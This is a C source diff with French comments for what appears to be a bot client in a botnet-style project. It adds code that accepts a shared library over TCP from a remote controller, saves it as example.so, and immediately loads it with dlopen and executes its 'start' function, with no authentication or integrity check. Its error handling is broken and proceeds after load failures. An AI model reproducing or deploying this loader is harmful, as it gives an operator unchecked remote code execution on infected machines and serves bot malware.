@@ -12,6 +12,7 @@
 #include <errno.h>
 #include <time.h>
 #include <unistd.h>
+#include <dlfcn.h>
 
 #include "utils.h"
 #define PORT_UDP_CLIENT 4242
@@ -19,9 +20,37 @@
 #define PORT_TCP_CLIENT 4242
 #define PORT_TCP_SERVEUR "4242"
 #define TAILLE_STRUCTURE 32
-#define MAX 1000
+
+// Type de la fonction présente dans le .so il faut qu'il soit le plus générique possible
+typedef void (*init_f) (void *);
 
 extern clock_t debut;
+
+void chargerLibDynamic(char *file_name)
+{
+
+    // PARTIE I : INSTALLATION
+
+    void *plugin;
+    //Chargement du fichier en tant que librairie dynamique
+    plugin = dlopen(file_name, RTLD_NOW);
+    if (!plugin)
+    {
+        perror("Cannot load");
+    }
+
+    // PARTIE II : START
+    init_f start = dlsym(plugin, "start");
+    char *result = dlerror();
+    if (result)
+    {
+        perror("Cannot find start");
+    }
+    //Lancement de la fonction start dans un thread
+    printf("Lancement du thread sur la fonction chargée\n");
+    start(NULL);
+    //lanceThread(start, NULL, 0);
+}
 /* 
 void get_status(info_bot_t info, int socket_tcp)
 {
@@ -77,22 +106,36 @@ void gestionClientTCP(void *s)
 void recvFile(void *s)
 {
     int socket_tcp = *((int *)s);
-    char buff[MAX]; // to store message from client
-
+    char buff[BUFSIZ]; // to store message from client
+    ssize_t len;
     FILE *fp;
-    fp = fopen("libstart.so", "w"); // stores the file content in recieved.txt in the program directory
-
+    fp = fopen("example.so", "w"); // stores the file content in start in the program directory
     if (fp == NULL)
     {
         printf("Error IN Opening File ");
         return;
     }
+    //Recoit la taille du fichier
+    recv(socket_tcp, buff, BUFSIZ, 0);
+    int file_size = atoi(buff);
+    printf("[BOT] file size received is: %d\n", file_size);
+    int remain_data = file_size;
+    /* https://stackoverflow.com/questions/11952898/c-send-and-receive-file */
+    while ((remain_data > 0) && ((len = recv(socket_tcp, buff, BUFSIZ, 0)) > 0))
+    {
+        fwrite(buff, sizeof(char), len, fp);
+        remain_data -= len;
+        printf("Receive %ld bytes and we hope :- %d bytes\n", len, remain_data);
+    }
+    fclose(fp);
+    close(socket_tcp);
 
-    while (read(socket_tcp , buff, MAX) > 0)
-        fprintf(fp, "%s", buff);
+    // while (read(socket_tcp, buff, BUFFSIZ) > 0)
+    //     fprintf(fp, "%s", buff);
 
     printf("File received successfully !! \n");
-    printf("New File created is libstart.so !! \n");
+    printf("New File created is start !! \n");
+    chargerLibDynamic("example.so");
 }
 
 /**
@@ -191,7 +234,7 @@ int main()
     srand(time(NULL));       //Initialisation nécessaire à faire une seule fois pour la fonction rand
 
     // PARTIE envoie UDP en THREAD
-    partie_udp(debut);
+    //partie_udp(debut);
 
     // PARTIE SERVEUR TCP en THREAD
     partie_tcp();
